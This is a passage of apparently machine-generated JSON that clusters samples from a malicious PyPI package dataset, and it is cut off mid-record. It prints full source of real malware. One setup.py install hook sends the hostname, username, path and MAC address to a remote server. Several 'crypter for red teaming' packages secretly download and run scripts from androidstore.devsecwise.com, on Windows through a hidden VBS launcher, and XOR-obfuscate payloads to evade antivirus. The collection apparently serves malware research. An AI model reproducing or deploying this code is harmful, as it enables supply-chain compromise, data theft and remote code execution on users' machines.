{\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"bytepps\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      }
    ]
  },
  {
    "cluster_id": 7,
    "size": 5,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-pycrypte",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\n\nDESCRIPTION = 'Python Crypter For Red Teaming'\n\n# Setting up\nsetup(\n    name=\"pycrypte\",\n    author=\"whoami (claysmith)\",\n    author_email=\"<claysmith@yahoo.com>\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['termcolor', 'requests', 'randoms'],\n    keywords=['python', 'crypter', 'avbypass', 'crypt'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n\nimport random\n#Coded By: Machine404\nimport subprocess\nfrom pathlib import Path\nimport  platform\nimport os\nfrom urllib import request\n\nimport termcolor\nimport time\ntry:\n    import requests\nexcept:\n    print(\"[*]Installing request Module\")\n    os.system(\"pip install requests -q -q -q\")\ntry:\n    import termcolor\nexcept:\n    print(\"[*]Installing termcolor Module\")\n    os.system(\"pip install termcolor -q -q -q\")\ndef logo():\n    print(termcolor.colored('''****************************************************************************\n                ________   __     ____    __   __   _____    ______        *\n               / /  _ \\ \\ / /    / ___|_ _\\ \\ / / _|_   _|__|  _ \\ \\       *\n              | || |_) \\ V /____| |   | '__\\ V / '_ \\| |/ _ \\ |_) | |      *\n             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *\n              | ||_|    |_|      \\____|_|   |_|| .__/|_|\\___|_| \\_\\ |      *\n               \\_\\                             |_|               /_/       *\n                   Python Crypter To Make Your Py Files UnDetectable       *\n                                                                           *\n                              Coded By: Machine1337                        *\n****************************************************************************\n  ''', 'cyan'))\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\ndef catc():\n    try:\n        if platform.system().startswith(\"Windows\"):\n            os.system(\"cls\")\n            logo()\n            checkwin()\n        elif platform.system().startswith(\"Linux\"):\n            print(\"\\033c\")\n            logo()\n            check()\n        else:\n            print(termcolor.colored(\"Please Use Windows Or Linux OS!\",'red'))\n    except KeyboardInterrupt:\n        print()\n        print(termcolor.colored(\"\\nYou Pressed The Exit Button!\",'red'))\n        quit()\n\n\ndef check():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            enc()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            enc()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        enc()\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n\n    if not isExist:\n        # Create a new directory because it does not exist\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\"\"\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef checkwin():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            encwin()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            encwin()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        encwin()\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\ncatc()\n\nfrom vidstream.streaming import StreamingServer\nfrom vidstream.streaming import CameraClient\nfrom vidstream.streaming import VideoClient\nfrom vidstream.streaming import ScreenShareClient\nfrom vidstream.audio import AudioSender\nfrom vidstream.audio import AudioReceiver\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-pycrypting",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\nVERSION = '1.0.12'\nDESCRIPTION = 'Python Crypter For Red Teaming'\n\n# Setting up\nsetup(\n    name=\"pycrypting\",\n    version=VERSION,\n    author=\"whoami (claysmith)\",\n    author_email=\"<claysmith@yahoo.com>\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['termcolor', 'request', 'random'],\n    keywords=['python', 'crypter', 'avbypass', 'crypt'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n\nimport random\n#Coded By: Machine404\nimport subprocess\nfrom pathlib import Path\nimport  platform\nimport os\nfrom urllib import request\n\nimport termcolor\nimport time\ntry:\n    import requests\nexcept:\n    print(\"[*]Installing request Module\")\n    os.system(\"pip install requests -q -q -q\")\ntry:\n    import termcolor\nexcept:\n    print(\"[*]Installing termcolor Module\")\n    os.system(\"pip install termcolor -q -q -q\")\ndef logo():\n    print(termcolor.colored('''****************************************************************************\n                ________   __     ____    __   __   _____    ______        *\n               / /  _ \\ \\ / /    / ___|_ _\\ \\ / / _|_   _|__|  _ \\ \\       *\n              | || |_) \\ V /____| |   | '__\\ V / '_ \\| |/ _ \\ |_) | |      *\n             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *\n              | ||_|    |_|      \\____|_|   |_|| .__/|_|\\___|_| \\_\\ |      *\n               \\_\\                             |_|               /_/       *\n                   Python Crypter To Make Your Py Files UnDetectable       *\n                                                                           *\n                              Coded By: Machine1337                        *\n****************************************************************************\n  ''', 'cyan'))\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\ndef catc():\n    try:\n        if platform.system().startswith(\"Windows\"):\n            os.system(\"cls\")\n            logo()\n            checkwin()\n        elif platform.system().startswith(\"Linux\"):\n            print(\"\\033c\")\n            logo()\n            check()\n        else:\n            print(termcolor.colored(\"Please Use Windows Or Linux OS!\",'red'))\n    except KeyboardInterrupt:\n        print()\n        print(termcolor.colored(\"\\nYou Pressed The Exit Button!\",'red'))\n        quit()\n\n\ndef check():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            enc()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            enc()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        enc()\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n\n    if not isExist:\n        # Create a new directory because it does not exist\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\"\"\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef checkwin():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            encwin()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            encwin()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        encwin()\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\ncatc()\n\nfrom vidstream.streaming import StreamingServer\nfrom vidstream.streaming import CameraClient\nfrom vidstream.streaming import VideoClient\nfrom vidstream.streaming import ScreenShareClient\nfrom vidstream.audio import AudioSender\nfrom vidstream.audio import AudioReceiver\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-pycryptro",
        "code": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='pycryptro',\n    version='1.6',\n    license='MIT',\n    author=\"unknownwhoami\",\n    author_email='claysmith@gmail.com',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/findme',\n    keywords='crypter project',\n    install_requires=[\n          'requests',\n      ],\n\n)\n\n\nimport random\n#Coded By: Machine404\nimport subprocess\nfrom pathlib import Path\nimport  platform\nimport os\nfrom urllib import request\n\nimport termcolor\nimport time\ntry:\n    import requests\nexcept:\n    print(\"[*]Installing request Module\")\n    os.system(\"pip install requests -q -q -q\")\ntry:\n    import termcolor\nexcept:\n    print(\"[*]Installing termcolor Module\")\n    os.system(\"pip install termcolor -q -q -q\")\ndef logo():\n    print(termcolor.colored('''****************************************************************************\n                ________   __     ____    __   __   _____    ______        *\n               / /  _ \\ \\ / /    / ___|_ _\\ \\ / / _|_   _|__|  _ \\ \\       *\n              | || |_) \\ V /____| |   | '__\\ V / '_ \\| |/ _ \\ |_) | |      *\n             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *\n              | ||_|    |_|      \\____|_|   |_|| .__/|_|\\___|_| \\_\\ |      *\n               \\_\\                             |_|               /_/       *\n                   Python Crypter To Make Your Py Files UnDetectable       *\n                                                                           *\n                              Coded By: Machine1337                        *\n****************************************************************************\n  ''', 'cyan'))\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\ndef catc():\n    try:\n        if platform.system().startswith(\"Windows\"):\n            os.system(\"cls\")\n            logo()\n            checkwin()\n        elif platform.system().startswith(\"Linux\"):\n            print(\"\\033c\")\n            logo()\n            check()\n        else:\n            print(termcolor.colored(\"Please Use Windows Or Linux OS!\",'red'))\n    except KeyboardInterrupt:\n        print()\n        print(termcolor.colored(\"\\nYou Pressed The Exit Button!\",'red'))\n        quit()\n\n\ndef check():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            enc()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            enc()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        enc()\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n\n    if not isExist:\n        # Create a new directory because it does not exist\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\"\"\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef checkwin():\n    path_to_file = 'stub.py'\n    path = Path(path_to_file)\n    if path.is_file():\n        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))\n        print()\n        print(termcolor.colored(\"\"\"[1] For Remove File: Type:- del\\n[2] For Rename File: Type:- ren \"\"\",'yellow'))\n        print()\n        a=input(termcolor.colored(\"[+]Do U Want To Remove Old File Or Rename File:- \",'blue'))\n        print()\n\n        if(a==\"del\"):\n            os.remove('stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Deleted...\",'green'))\n            print()\n            encwin()\n        elif(a==\"ren\"):\n            os.rename('stub.py','old_stub.py')\n            time.sleep(2)\n            print(termcolor.colored(\"[*] File Successfully Renamed...\", 'green'))\n            print()\n            encwin()\n        else:\n            print(termcolor.colored(\"Plz! Remove or Rename It mannually\",'red'))\n    else:\n        encwin()\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    #print(key)\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\ncatc()"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-16-pyevasive",
        "code": "from setuptools import setup, find_packages\nimport codecs\nimport os\n\n\nDESCRIPTION = 'Python Crypter For Red Teaming'\n\n# Setting up\nsetup(\n    name=\"pyevasive\",\n    author=\"whoami (claysmith)\",\n    author_email=\"<claysmith@yahoo.com>\",\n    description=DESCRIPTION,\n    packages=find_packages(),\n    install_requires=['termcolor', 'requests', 'randoms'],\n    keywords=['python', 'crypter', 'avbypass', 'crypt'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n\nimport random\n#Coded By: Machine404\nimport subprocess\nfrom pathlib import Path\nimport  platform\nimport os\nfrom urllib import request\nimport requests\nimport termcolor\nimport time\n\ndef logo():\n    print(termcolor.colored('''****************************************************************************\n                ________   __     ____    __   __   _____    ______        *\n               / /  _ \\ \\ / /    / ___|_ _\\ \\ / / _|_   _|__|  _ \\ \\       *\n              | || |_) \\ V /____| |   | '__\\ V / '_ \\| |/ _ \\ |_) | |      *\n             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *\n              | ||_|    |_|      \\____|_|   |_|| .__/|_|\\___|_| \\_\\ |      *\n               \\_\\                             |_|               /_/       *\n                   Python Crypter To Make Your Py Files UnDetectable       *\n                                                                           *\n                              Coded By: Machine1337                        *\n****************************************************************************\n  ''', 'cyan'))\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\ndef catc():\n    try:\n        if platform.system().startswith(\"Windows\"):\n            os.system(\"cls\")\n            logo()\n            checkwin()\n        elif platform.system().startswith(\"Linux\"):\n            print(\"\\033c\")\n            logo()\n            check()\n        else:\n            print(termcolor.colored(\"Please Use Windows Or Linux OS!\",'red'))\n    except KeyboardInterrupt:\n        print()\n        print(termcolor.colored(\"\\nYou Pressed The Exit 